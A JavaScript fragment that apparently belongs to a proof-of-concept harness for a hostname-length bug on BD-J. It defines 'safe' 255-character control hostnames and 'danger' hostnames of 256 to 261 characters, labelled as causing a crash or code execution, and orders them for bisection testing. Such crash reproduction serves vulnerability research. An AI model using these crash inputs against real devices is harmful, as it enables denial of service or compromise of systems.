function hostFlat(body, suffix) {
  if (suffix === undefined) {
    suffix = '.local';
  }
  return repeatCh('C', body) + suffix;
}

function hostDotted255() {
  return repeatCh('d', 63) + '.' + repeatCh('e', 63) + '.'
    + repeatCh('f', 63) + '.' + repeatCh('g', 54) + '.local';
}

function hostFourBy63Plain() {
  return repeatCh('a', 63) + '.' + repeatCh('b', 63) + '.'
    + repeatCh('c', 63) + '.' + repeatCh('d', 63);
}

function hostDotted261Local() {
  return repeatCh('a', 63) + '.' + repeatCh('b', 63) + '.'
    + repeatCh('c', 63) + '.' + repeatCh('d', 63) + '.local';
}

function hostThreeBy63PlusLocal(extraLabelLen) {
  return repeatCh('x', 63) + '.' + repeatCh('y', 63) + '.'
    + repeatCh('z', 63) + '.' + repeatCh('q', extraLabelLen) + '.local';
}

var HOSTS = {
  safe255: {
    label: '255 flat .local (invalid 249-label)',
    host: hostFlat(249),
    danger: false,
    note: 'BD-J baseline safe; label >63'
  },
  safe255Dotted: {
    label: '252 dotted .local (valid wire)',
    host: hostDotted255(),
    danger: false,
    note: 'Valid DNS labels'
  },
  safe2554x63: {
    label: '255 plain 4×63 (valid wire)',
    host: hostFourBy63Plain(),
    danger: false,
    note: 'Best 255 — hits resolver'
  },
  crash256: {
    label: '256 flat .local (BD-J PoC)',
    host: hostFlat(250),
    danger: true,
    note: '250 C + .local; CE on BD-J'
  },
  crash256Plain: {
    label: '256 plain no suffix',
    host: repeatCh('P', 256),
    danger: true,
    note: 'Single 256-char label'
  },
  crash256Dotted: {
    label: '261 dotted 4×63+.local',
    host: hostDotted261Local(),
    danger: true,
    note: 'Valid wire; CE on BD-J bisect'
  },
  crash260Dotted: {
    label: '260 dotted 3×63+62+.local',
    host: hostThreeBy63PlusLocal(62),
    danger: true,
    note: 'Valid wire, 260 total'
  },
  crash256Dual: {
    label: '256 flat dual iframe',
    host: hostFlat(250),
    danger: true,
    note: 'pair-dual style'
  }
};

var INDEX_SECTIONS = [
  {
    title: 'Oracles + 255 ghost (no CE)',
    keys: [],
    oracle: true
  },
  {
    title: 'Safe 255 — controls',
    keys: ['safe2554x63', 'safe255Dotted', 'safe255']
  },
  {
    title: 'Crash — try valid wire FIRST (261, 260)',
    keys: ['crash256Dotted', 'crash260Dotted']
  },
  {
    title: 'Crash — flat 256 (BD-J PoC)',
    keys: ['crash256', 'crash256Plain']
  }
];
